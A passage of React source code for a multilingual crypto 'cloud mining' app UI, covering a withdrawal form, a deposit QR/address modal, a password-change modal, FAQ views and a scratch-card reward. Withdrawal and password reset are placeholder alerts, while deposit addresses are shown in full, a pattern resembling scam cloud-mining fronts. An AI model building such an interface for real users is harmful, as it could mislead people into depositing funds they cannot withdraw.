                    <div className="bg-[#1a1a1a] border border-white/10 rounded-3xl p-6 focus-within:border-[#ff5a00]/50 transition-colors shadow-inner group">
                      <input 
                        type="text"
                        placeholder="Veuillez saisir ou appuyer longuement pour..."
                        className="w-full bg-transparent border-none text-white font-bold placeholder:text-gray-700 focus:ring-0 p-0 text-sm"
                      />
                    </div>
                  </div>

                  {/* Amount Field (Image 3 style) */}
                  <div className="space-y-4">
                    <p className="text-white/40 font-black text-[10px] uppercase tracking-[0.2em]">Montant du retrait</p>
                    <div className="bg-[#1a1a1a] border border-white/10 rounded-3xl p-6 flex items-center focus-within:border-[#ff5a00]/50 transition-colors shadow-inner">
                      <input 
                        type="number"
                        placeholder="Veuillez saisir le montant du transfert"
                        className="flex-1 bg-transparent border-none text-white font-black placeholder:text-gray-700 focus:ring-0 p-0 text-lg"
                      />
                      <button 
                        onClick={() => setState(prev => ({ ...prev, withdrawAmount: state.mining.toString() }))}
                        className="bg-[#ff5a00]/10 text-[#ff5a00] font-black text-[10px] px-3 py-1.5 rounded-lg uppercase tracking-wider hover:bg-[#ff5a00] hover:text-white transition-all active:scale-90"
                      >
                        Tous
                      </button>
                    </div>
                    <div className="flex flex-wrap items-center justify-between gap-y-2 px-2">
                        <p className="text-[10px] text-gray-500 font-bold uppercase tracking-wider">
                         Min: <span className="text-white/80">1.00 {state.selectedAsset.symbol}</span>
                        </p>
                        <p className="text-[10px] text-gray-500 font-bold uppercase tracking-wider">
                         Max: <span className="text-white/80">9.9M {state.selectedAsset.symbol}</span>
                        </p>
                    </div>
                  </div>

                  {/* Security Password (Image 3 style) */}
                  <div className="space-y-4">
                    <p className="text-white/40 font-black text-[10px] uppercase tracking-[0.2em]">Mot de passe de sécurité</p>
                    <div className="bg-[#1a1a1a] border border-white/10 rounded-3xl p-6 flex items-center focus-within:border-[#ff5a00]/50 transition-colors shadow-inner relative group">
                      <input 
                        type="password"
                        placeholder="Mot de passe de sécurité"
                        className="flex-1 bg-transparent border-none text-white font-bold placeholder:text-gray-700 focus:ring-0 p-0 text-sm"
                      />
                      <div className="flex items-center gap-4">
                        <button className="text-gray-600 hover:text-gray-400 transition-colors">
                          <Users size={18} />
                        </button>
                        <button className="text-white/30 hover:text-white transition-colors">
                          <Eye size={18} />
                        </button>
                      </div>
                    </div>
                  </div>

                  {/* Fees/Arrival (Image 3 style) */}
                  <div className="bg-white/5 border border-white/5 rounded-3xl p-6 space-y-4">
                      <div className="flex items-center justify-between">
                        <span className="text-xs text-gray-500 font-bold uppercase tracking-wider">Frais:</span>
                        <span className="text-xs text-white font-black">0.00 {state.selectedAsset.symbol}</span>
                      </div>
                      <div className="h-px bg-white/5 w-full" />
                      <div className="flex items-center justify-between">
                        <span className="text-xs text-gray-500 font-bold uppercase tracking-wider">Arrivée réelle :</span>
                        <span className="text-sm text-[#ff5a00] font-black">0.00 {state.selectedAsset.symbol}</span>
                      </div>
                  </div>

                </div>

                {/* Bottom Bar for Confirm Button (Image 3 style) */}
                <div className="bg-[#0a0a0a]/90 backdrop-blur-xl border-t border-white/5 px-6 py-6 sticky bottom-0 z-20">
                  <button 
                    onClick={() => alert(t.withdrawAlert)}
                    className="w-full bg-gradient-to-r from-orange-600 to-orange-500 hover:brightness-110 active:scale-95 transition-all text-white font-black py-6 rounded-3xl text-lg uppercase tracking-[0.2em] shadow-[0_20px_50px_rgba(234,88,12,0.3)]"
                  >
                    CONFIRMER
                  </button>
                </div>
              </div>
            ) : (
              /* --- ASSET PICKER VIEW (IMAGE 2) --- */
              <div className="flex-1 flex flex-col overflow-hidden">
                {/* Header */}
                <div className="flex items-center px-4 py-5 bg-white border-b border-gray-100 z-10">
                  <button 
                    onClick={() => setState(prev => ({ ...prev, isWalletModalOpen: false }))}
                    className="w-10 h-10 flex items-center justify-center text-gray-800"
                  >
                    <ChevronRight size={24} className={lang === 'ar' ? '' : 'rotate-180'} />
                  </button>
                  <h2 className="flex-1 text-center text-xl font-bold text-gray-900 mr-10 uppercase tracking-widest">{t.withdraw}</h2>
                </div>

                {/* Search & Tabs (Image 2 style) */}
                <div className="bg-white px-5 pt-4 pb-0 z-10">
                   <div className="relative mb-6">
                    <Search className={`absolute ${lang === 'ar' ? 'right-4' : 'left-4'} top-1/2 -translate-y-1/2 text-gray-400`} size={18} />
                    <input 
                      type="text" 
                      value={state.receiveSearchTerm}
                      onChange={(e) => setState(prev => ({ ...prev, receiveSearchTerm: e.target.value }))}
                      placeholder={lang === 'fr' ? 'Rechercher' : (lang === 'ar' ? 'بحث' : 'Search')}
                      className={`w-full bg-[#f1f3f4] border-none rounded-2xl py-4 ${lang === 'ar' ? 'pr-12 pl-4 text-right' : 'pl-12 pr-4 text-left'} text-gray-900 placeholder:text-gray-400 focus:ring-0 text-sm font-bold tracking-tight`}
                    />
                  </div>

                  <div className="flex items-center gap-3 mb-6 overflow-x-auto scrollbar-hide no-scrollbar scroll-smooth">
                    {['Tous', 'BTC', 'ETH', 'SOL', 'BNB', 'TRX'].map((chip) => (
                      <button 
                        key={chip}
                        onClick={() => setState(prev => ({ ...prev, selectedNetwork: chip }))}
                        className={`px-8 py-3 rounded-full text-xs font-black transition-all whitespace-nowrap border-2
                          ${state.selectedNetwork === chip 
                            ? 'bg-blue-600 border-blue-600 text-white shadow-xl shadow-blue-200' 
                            : 'bg-transparent border-transparent text-gray-400'}
                        `}
                      >
                        {chip.toUpperCase()}
                      </button>
                    ))}
                  </div>
                </div>

                {/* Scrollable List (Image 2 style) */}
                <div className="flex-1 overflow-y-auto px-5 pb-20 bg-white">
                  <div className="pt-2">
                     <h3 className={`text-[10px] font-black text-gray-300 uppercase tracking-[0.2em] mb-8 ${lang === 'ar' ? 'text-right' : 'text-left'}`}>
                       POPULAR
                     </h3>

                     <div className="space-y-8">
                       {CRYPTO_ASSETS
                         .filter(a => 
                           (state.selectedNetwork === 'Tous' || state.selectedNetwork === 'all' || a.symbol === state.selectedNetwork || a.network.includes(state.selectedNetwork)) &&
                           (a.name.toLowerCase().includes(state.receiveSearchTerm.toLowerCase()) || a.symbol.toLowerCase().includes(state.receiveSearchTerm.toLowerCase()))
                         ).map((asset) => (
                         <button 
                          key={asset.id}
                          onClick={() => setState(prev => ({ ...prev, selectedAsset: asset, isReceiveDetailOpen: true }))}
                          className="w-full flex items-center justify-between group active:scale-95 transition-all text-left"
                         >
                           <div className="flex items-center gap-4">
                              <div className={`w-14 h-14 rounded-full flex items-center justify-center p-1 bg-white shadow-xl border border-gray-50`}>
                                 <img 
                                    src={asset.icon} 
                                    className="w-full h-full object-contain rounded-full" 
                                    alt={asset.symbol}
                                    onError={(e) => {
                                      (e.target as any).src = `https://ui-avatars.com/api/?name=${asset.symbol}&background=${asset.color.replace('#', '')}&color=fff&bold=true`;
                                    }}
                                 />
                              </div>
                              <div>
                                 <div className="flex items-center gap-2">
                                    <span className="font-black text-gray-900 text-lg leading-none">{asset.symbol}</span>
                                    <span className="text-[9px] bg-gray-100 text-gray-400 px-2 py-0.5 rounded font-black uppercase tracking-widest">
                                       {asset.name}
                                    </span>
                                 </div>
                                 <p className="text-xs text-gray-400 font-bold uppercase tracking-tighter mt-1 opacity-60">
                                    {asset.address.slice(0, 10)}...{asset.address.slice(-10)}
                                 </p>
                              </div>
                           </div>
                           
                           <div className="flex gap-2">
                              <div className="w-11 h-11 bg-gray-50 border border-gray-100 rounded-xl flex items-center justify-center transition-all group-hover:bg-gray-100">
                                <Scan size={18} className="text-gray-300" />
                              </div>
                              <div className="w-11 h-11 bg-gray-50 border border-gray-100 rounded-xl flex items-center justify-center transition-all group-hover:bg-gray-100">
                                <Copy size={18} className="text-gray-300" />
                              </div>
                           </div>
                         </button>
                       ))}
                     </div>
                  </div>
                </div>
              </div>
            )}
          </motion.div>
        )}
      </AnimatePresence>

      {/* Asset Detail Modal (QR View) */}
      <AnimatePresence>
        {state.isReceiveDetailOpen && state.selectedAsset && (
          <div className="fixed inset-0 z-[110] flex flex-col items-center justify-center bg-black/60 backdrop-blur-sm">
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white w-[90%] max-w-sm rounded-[32px] overflow-hidden flex flex-col p-6 shadow-2xl"
            >
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                   <div className="w-10 h-10 rounded-full border border-gray-100 p-1">
                      <img src={state.selectedAsset.icon} className="w-full h-full object-contain" alt="" />
                   </div>
                   <div>
                     <h4 className="font-black text-gray-900">{state.selectedAsset.symbol}</h4>
                     <p className="text-[10px] font-bold text-gray-400 bg-gray-100 px-2 rounded-md uppercase w-fit">COIN</p>
                   </div>
                </div>
                <button 
                  onClick={() => setState(prev => ({ ...prev, isReceiveDetailOpen: false }))}
                  className="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center text-gray-400"
                >
                  <X size={20} />
                </button>
              </div>

              {/* Warning Banner */}
              <div className="bg-orange-50 border border-orange-100 rounded-2xl p-3 mb-6 flex gap-3 items-center">
                 <div className="text-orange-500"><ShieldCheck size={20} /></div>
                 <p className="text-[11px] text-orange-950 font-medium leading-tight">
                   {lang === 'fr' 
                     ? `N'envoyez que des (${state.selectedAsset.symbol}) à cette adresse. Les autres actifs seront perdus à jamais.`
                     : `Only send (${state.selectedAsset.symbol}) to this address. Other assets will be lost forever.`}
                 </p>
              </div>

              {/* QR Code */}
              <div className="flex flex-col items-center mb-8">
                <div className="bg-white p-4 border-2 border-gray-50 rounded-3xl mb-4 shadow-sm">
                  <img 
                    src={`https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${state.selectedAsset.address}&bgcolor=ffffff&color=000000`} 
                    alt="Address QR" 
                    className="w-44 h-44"
                  />
                </div>
                <p className="text-xs font-mono text-gray-500 font-bold tracking-tight text-center break-all px-4">
                  {state.selectedAsset.address}
                </p>
              </div>

              {/* Actions Grid */}
              <div className="grid grid-cols-3 gap-2 mb-8">
                <button 
                  onClick={() => {
                    navigator.clipboard.writeText(state.selectedAsset.address);
                    alert(lang === 'fr' ? 'Copié !' : 'Copied!');
                  }}
                  className="flex flex-col items-center gap-2"
                >
                  <div className="w-14 h-14 bg-gray-100 rounded-2xl flex items-center justify-center text-gray-800 transition-transform active:scale-90">
                    <Copy size={24} />
                  </div>
                  <span className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">{lang === 'fr' ? 'Copier' : 'Copy'}</span>
                </button>
                <button className="flex flex-col items-center gap-2">
                  <div className="w-14 h-14 bg-gray-100 rounded-2xl flex items-center justify-center text-gray-400">
                    <Layout size={24} />
                  </div>
                  <span className="text-[10px] font-bold text-gray-400 uppercase tracking-widest text-center leading-tight">
                    {lang === 'fr' ? 'Définir le montant' : 'Set Amount'}
                  </span>
                </button>
                <button className="flex flex-col items-center gap-2">
                  <div className="w-14 h-14 bg-gray-100 rounded-2xl flex items-center justify-center text-gray-800">
                    <ArrowUpRight size={24} />
                  </div>
                  <span className="text-[10px] font-bold text-gray-400 uppercase tracking-widest leading-tight">{lang === 'fr' ? 'Partager' : 'Share'}</span>
                </button>
              </div>

              {/* Secondary Actions */}
              <div className="mt-auto pt-6 border-t border-gray-100">
                <button className="w-full flex items-center gap-4 bg-gray-50 hover:bg-gray-100 p-4 rounded-3xl transition-colors group">
                   <div className="w-10 h-10 bg-white rounded-2xl flex items-center justify-center shadow-sm">
                      <div className="w-6 h-6 rounded-full bg-[#f3ba2f] flex items-center justify-center transition-transform group-hover:rotate-12">
                        <ArrowUpRight size={14} className="text-white" />
                      </div>
                   </div>
                   <div className="flex-1 text-left">
                     <p className="text-[11px] font-black text-gray-900 leading-none mb-1">Binance</p>
                     <p className="text-[10px] font-bold text-gray-400 truncate">Deposit from your Binance account</p>
                   </div>
                   <ChevronRight size={18} className="text-gray-300 group-hover:text-gray-400 transition-colors" />
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>


      {/* Security Password Modal */}
      <AnimatePresence>
        {state.isSecurityModalOpen && (
          <motion.div 
            initial={{ x: '100%' }}
            animate={{ x: 0 }}
            exit={{ x: '100%' }}
            transition={{ type: 'spring', damping: 25, stiffness: 200 }}
            className="fixed inset-0 z-[200] bg-[#0b0c10] flex flex-col pt-8"
          >
            {/* Header */}
            <header className="flex items-center px-6 mb-12">
              <button 
                onClick={() => setState(prev => ({ ...prev, isSecurityModalOpen: false }))}
                className="w-10 h-10 flex items-center justify-center text-white"
              >
                <ChevronRight size={24} className={lang === 'ar' ? '' : 'rotate-180'} />
              </button>
              <h2 className="flex-1 text-center text-lg font-bold text-white mr-10">{t.securityPassword}</h2>
            </header>

            <div className="flex-1 px-5">
              <div className="bg-[#1c1c1e] rounded-[32px] p-8 border border-white/5 space-y-4">
                {/* Old Password */}
                <div className="bg-black/40 rounded-2xl p-4 flex items-center justify-between border border-white/5">
                  <div className="flex items-center gap-3 flex-1">
                    <Shield size={18} className="text-gray-500" />
                    <input 
                      type={state.showOldSecPass ? "text" : "password"} 
                      placeholder={t.oldSecurityPassword}
                      value={state.oldSecPass}
                      onChange={(e) => setState(prev => ({ ...prev, oldSecPass: e.target.value }))}
                      className="flex-1 bg-transparent border-none focus:outline-none text-white text-sm"
                    />
                  </div>
                  <button 
                    onClick={() => setState(prev => ({ ...prev, showOldSecPass: !prev.showOldSecPass }))}
                    className="text-gray-500 hover:text-white transition-colors"
                  >
                    {state.showOldSecPass ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>

                {/* New Password */}
                <div className="bg-black/40 rounded-2xl p-4 flex items-center justify-between border border-white/5">
                  <div className="flex items-center gap-3 flex-1">
                    <Shield size={18} className="text-gray-500" />
                    <input 
                      type={state.showNewSecPass ? "text" : "password"} 
                      placeholder={t.newSecurityPassword}
                      value={state.newSecPass}
                      onChange={(e) => setState(prev => ({ ...prev, newSecPass: e.target.value }))}
                      className="flex-1 bg-transparent border-none focus:outline-none text-white text-sm"
                    />
                  </div>
                  <button 
                    onClick={() => setState(prev => ({ ...prev, showNewSecPass: !prev.showNewSecPass }))}
                    className="text-gray-500 hover:text-white transition-colors"
                  >
                    {state.showNewSecPass ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>

                {/* Confirm New Password */}
                <div className="bg-black/40 rounded-2xl p-4 flex items-center justify-between border border-white/5">
                  <div className="flex items-center gap-3 flex-1">
                    <Shield size={18} className="text-gray-500" />
                    <input 
                      type={state.showConfirmSecPass ? "text" : "password"} 
                      placeholder={t.confirmNewPassword}
                      value={state.confirmSecPass}
                      onChange={(e) => setState(prev => ({ ...prev, confirmSecPass: e.target.value }))}
                      className="flex-1 bg-transparent border-none focus:outline-none text-white text-sm"
                    />
                  </div>
                  <button 
                    onClick={() => setState(prev => ({ ...prev, showConfirmSecPass: !prev.showConfirmSecPass }))}
                    className="text-gray-500 hover:text-white transition-colors"
                  >
                    {state.showConfirmSecPass ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>

                {/* Confirm Button */}
                <button 
                  onClick={() => {
                    alert('Password Reset Successful!');
                    setState(prev => ({ ...prev, isSecurityModalOpen: false, oldSecPass: '', newSecPass: '', confirmSecPass: '' }));
                  }}
                  className="w-full bg-gradient-to-r from-orange-600 to-orange-500 py-5 rounded-3xl font-black text-white shadow-xl shadow-orange-950/20 active:scale-95 transition-all text-sm uppercase tracking-wider mt-8"
                >
                  {t.confirmBtn}
                </button>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* FAQ Modal */}
      <AnimatePresence>
        {state.isFaqModalOpen && (
          <motion.div 
            initial={{ x: '100%' }}
            animate={{ x: 0 }}
            exit={{ x: '100%' }}
            transition={{ type: 'spring', damping: 25, stiffness: 200 }}
            className="fixed inset-0 z-[200] bg-[#0b0c10] flex flex-col pt-8"
          >
            {/* Header */}
            <header className="flex items-center px-6 mb-6">
              <button 
                onClick={() => setState(prev => ({ ...prev, isFaqModalOpen: false }))}
                className="w-10 h-10 flex items-center justify-center text-white"
              >
                <ChevronRight size={24} className={lang === 'ar' ? '' : 'rotate-180'} />
              </button>
              <h2 className="flex-1 text-center text-lg font-bold text-white mr-10">{t.faq}</h2>
            </header>

            {/* Tabs */}
            <div className="flex gap-8 px-8 mb-8 border-b border-white/5">
              <button 
                onClick={() => setState(prev => ({ ...prev, faqActiveTab: 'about' }))}
                className={`pb-4 text-sm font-bold transition-all relative ${state.faqActiveTab === 'about' ? 'text-white' : 'text-gray-500'}`}
              >
                {t.tabAboutCloudMining}
                {state.faqActiveTab === 'about' && (
                  <motion.div layoutId="faqTab" className="absolute bottom-0 left-0 right-0 h-1 bg-orange-600 rounded-full" />
                )}
              </button>
              <button 
                onClick={() => setState(prev => ({ ...prev, faqActiveTab: 'welfare' }))}
                className={`pb-4 text-sm font-bold transition-all relative ${state.faqActiveTab === 'welfare' ? 'text-white' : 'text-gray-500'}`}
              >
                {t.tabWelfare}
                {state.faqActiveTab === 'welfare' && (
                  <motion.div layoutId="faqTab" className="absolute bottom-0 left-0 right-0 h-1 bg-orange-600 rounded-full" />
                )}
              </button>
            </div>

            {/* List */}
            <div className="flex-1 px-5 overflow-y-auto">
              <div className="bg-[#1c1c1e] rounded-[32px] p-4 border border-white/5 space-y-2">
                {FAQ_DATA[state.faqActiveTab].map((item) => (
                  <button 
                    key={item.id}
                    onClick={() => setState(prev => ({ ...prev, selectedFaqItem: item, isFaqDetailOpen: true }))}
                    className="w-full flex items-center justify-between p-4 rounded-2xl hover:bg-white/5 transition-colors group"
                  >
                    <span className="text-white text-sm font-medium text-left">{item.title[lang] || item.title['en']}</span>
                    <ChevronRight size={18} className="text-gray-600 group-hover:text-white transition-colors" />
                  </button>
                ))}
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* FAQ Detail Modal */}
      <AnimatePresence>
        {state.isFaqDetailOpen && state.selectedFaqItem && (
          <motion.div 
            initial={{ x: '100%' }}
            animate={{ x: 0 }}
            exit={{ x: '100%' }}
            transition={{ type: 'spring', damping: 25, stiffness: 200 }}
            className="fixed inset-0 z-[300] bg-[#0b0c10] flex flex-col pt-8"
          >
            {/* Header */}
            <header className="flex items-center px-6 mb-6">
              <button 
                onClick={() => setState(prev => ({ ...prev, isFaqDetailOpen: false }))}
                className="w-10 h-10 flex items-center justify-center text-white"
              >
                <ChevronRight size={24} className={lang === 'ar' ? '' : 'rotate-180'} />
              </button>
              <h2 className="flex-1 text-center text-lg font-bold text-white mr-10">{t.faqDetail}</h2>
            </header>

            <div className="flex-1 px-6 overflow-y-auto pb-12">
              <h1 className="text-2xl font-black text-white mb-8">
                {state.selectedFaqItem.title[lang] || state.selectedFaqItem.title['en']}
              </h1>
              <div className="text-gray-400 text-sm leading-relaxed whitespace-pre-wrap">
                {state.selectedFaqItem.content[lang] || state.selectedFaqItem.content['en']}
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

// --- SUB-COMPONENTS ---

function ActionButton({ icon, label, color, onClick }: { icon: ReactNode, label: string, color: 'blue' | 'gold' | 'yellow' | 'gray', onClick: () => void }) {
  const colors = {
    blue: 'bg-blue-500/10 text-blue-400 group-hover:bg-blue-500 group-hover:text-black',
    gold: 'bg-[#f3ba2f]/10 text-[#f3ba2f] group-hover:bg-[#f3ba2f] group-hover:text-black shadow-[inset_0_0_20px_rgba(243,186,47,0.05)]',
    yellow: 'bg-amber-400 text-black hover:scale-105',
    gray: 'bg-[#1c1c1e] text-white/90 border border-white/5 shadow-xl hover:bg-[#2c2c2e]'
  };

  return (
    <motion.button 
      whileTap={{ scale: 0.95 }}
      onClick={onClick}
      className="flex flex-col items-center gap-3 group"
    >
      <div className={`w-16 h-16 rounded-[22px] flex items-center justify-center transition-all duration-300 ${colors[color]}`}>
        {icon}
      </div>
      <span className="text-[11px] font-bold text-gray-400 group-hover:text-white transition-colors text-center">
        {label}
      </span>
    </motion.button>
  );
}

function ScratchCard({ 
  reward, 
  isAlreadyScratched, 
  onReveal, 
  translations: t,
  isLocked
}: any) {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [isRevealed, setIsRevealed] = useState(isAlreadyScratched);
  const [isScratching, setIsScratching] = useState(false);
  const [scratchPoints, setScratchPoints] = useState(0);

  useEffect(() => {
    if (isAlreadyScratched || isLocked) return;
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    const rect = canvas.parentElement?.getBoundingClientRect();
    if (rect) {
      canvas.width = rect.width;
      canvas.height = rect.height;
    }

    ctx.fillStyle = '#b0b0b0';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    
    ctx.fillStyle = 'rgba(0,0,0,0.05)';
    for(let i=0; i<400; i++) {
      ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, 1, 1);
    }
    
    ctx.font = 'bold 20px sans-serif';
    ctx.fillStyle = 'rgba(0,0,0,0.4)';
    ctx.textAlign = 'center';
    ctx.fillText(t.scratchHere, canvas.width/2, canvas.height/2 + 7);
  }, [t.scratchHere, isAlreadyScratched, isLocked]);

  const scratch = (clientX: number, clientY: number) => {
    if (isRevealed || !canvasRef.current || isLocked) return;
    const canvas = canvasRef.current;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    const rect = canvas.getBoundingClientRect();
    const x = clientX - rect.left;
    const y = clientY - rect.top;

    ctx.globalCompositeOperation = 'destination-out';
    ctx.beginPath();
    ctx.arc(x, y, 35, 0, Math.PI * 2);
    ctx.fill();

    setScratchPoints(prev => prev + 1);
  };

  const handleStart = (e: MouseEvent | TouchEvent) => {
    if (isRevealed || isLocked) return;
    setIsScratching(true);
    const clientX = 'touches' in e ? e.touches[0].clientX : (e as MouseEvent).clientX;
    const clientY = 'touches' in e ? e.touches[0].clientY : (e as MouseEvent).clientY;
    scratch(clientX, clientY);
  };

  const handleMove = (e: MouseEvent | TouchEvent) => {
    if (!isScratching) return;
    const clientX = 'touches' in e ? e.touches[0].clientX : (e as MouseEvent).clientX;
    const clientY = 'touches' in e ? e.touches[0].clientY : (e as MouseEvent).clientY;
    scratch(clientX, clientY);
  };

  const handleEnd = () => {
    setIsScratching(false);
  };

  useEffect(() => {
    if (scratchPoints > 40 && !isRevealed) {
      setIsRevealed(true);
      onReveal();
    }
  }, [scratchPoints, isRevealed, onReveal]);

  return (
    <div 
      className={`relative h-44 rounded-3xl overflow-hidden shadow-lg group transition-all duration-500 ${isRevealed ? 'bg-white' : 'bg-[#c4c4c4]'}`}
      onMouseDown={handleStart}
      onMouseMove={handleMove}
      onMouseUp={handleEnd}
      onMouseLeave={handleEnd}
      onTouchStart={handleStart}
      onTouchMove={handleMove}
      onTouchEnd={handleEnd}
    >
      <div className="absolute inset-0 flex flex-col items-center justify-center p-4">
        <div className="text-[#f3ba2f] mb-2 scale-125">
           <span className="text-4xl text-black">💰</span>
        </div>
        <p className="text-gray-400 text-[10px] font-black uppercase tracking-widest">{t.winAmount}</p>
        <h4 className="text-3xl font-black text-black">
          ${reward.toFixed(2)}
        </h4>
      </div>

      {!isAlreadyScratched && (
        <motion.canvas 
          ref={canvasRef}
          animate={{ opacity: isRevealed ? 0 : 1 }}
          className="absolute inset-0 z-10 touch-none"
        />
      )}
    </div>
  );
}

function NavTab({ active, icon, label, onClick }: { active?: boolean, icon: ReactNode, label: string, onClick?: () => void }) {
  return (
    <button 
      onClick={onClick}
      className={`flex flex-col items-center gap-1.5 transition-all ${active ? 'text-[#f3ba2f]' : 'text-gray-600 hover:text-gray-400'}`}
    >
      <div className={active ? 'drop-shadow-[0_0_8px_rgba(243,186,47,0.5)]' : ''}>
        {icon}
      </div>
      <span className="text-[10px] font-bold uppercase tracking-tighter leading-none text-center max-w-[60px]">{label}</span>
      {active && <div className="w-1 h-1 bg-[#f3ba2f] rounded-full mt-0.5" />}
    </button>
  );
}

function ProfileAppAction({ icon, label, onClick }: { icon: ReactNode, label: string, onClick?: () => void }) {
  return (
    <button onClick={onClick} className="flex flex-col items-center gap-2 group">
      <div className="w-12 h-14 bg-white/5 rounded-2xl flex items-center justify-center border border-white/5 group-active:scale-95 transition-all">
        {icon}
      </div>
      <span className="text-[10px] font-bold text-gray-500 uppercase leading-tight px-1">{label}</span>
    </button>
  );
}

function ProfileLinkAction({ icon, label, onClick }: { icon: ReactNode, label: string, onClick?: () => void }) {
  return (
    <button onClick={onClick} className="flex flex-col items-center gap-2 group">
      {icon}
      <span className="text-[10px] font-bold text-gray-400 leading-tight uppercase px-1 h-[24px] flex items-center justify-center transition-colors group-active:text-[#f3ba2f]">{label}</span>
    </button>
  );
}

